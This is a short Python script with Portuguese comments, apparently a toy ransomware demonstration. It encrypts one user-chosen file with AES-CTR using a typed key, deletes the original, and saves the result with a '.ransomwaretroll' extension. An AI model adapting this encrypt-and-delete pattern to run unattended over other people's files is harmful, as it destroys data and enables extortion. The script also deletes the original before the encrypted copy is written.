import os
import pyaes
import getpass

# inserir o caminho do arquivo a ser criptografado
path = input('Digite o caminho do arquivo: ')

# ler o arquivo a ser criptografado
with open(path, "rb") as f:
    file_data = f.read()

# inserir a chave de criptografia
key = getpass.getpass('\nInsira a CHAVE de criptografia!\n\nCertifique-se que a CHAVE tenha 16, 24 ou 32 caracteres de comprimento: ').encode('utf-8')

# loop para verificar o comprimento da chave
while True:
    if len(key) not in [16, 24, 32]:
        key = getpass.getpass('\nCHAVE inválida!\n\nCertifique-se que a CHAVE tenha 16, 24 ou 32 caracteres de comprimento! ').encode('utf-8')
    else:
        break

# remover o arquivo
os.remove(path)

# criptografar o arquivo
aes = pyaes.AESModeOfOperationCTR(key)
crypto_data = aes.encrypt(file_data)

# salvar o arquivo criptografado
with open(path + ".ransomwaretroll", "wb") as encrypted_f:
    encrypted_f.write(crypto_data)

print('\nArquivo criptografado')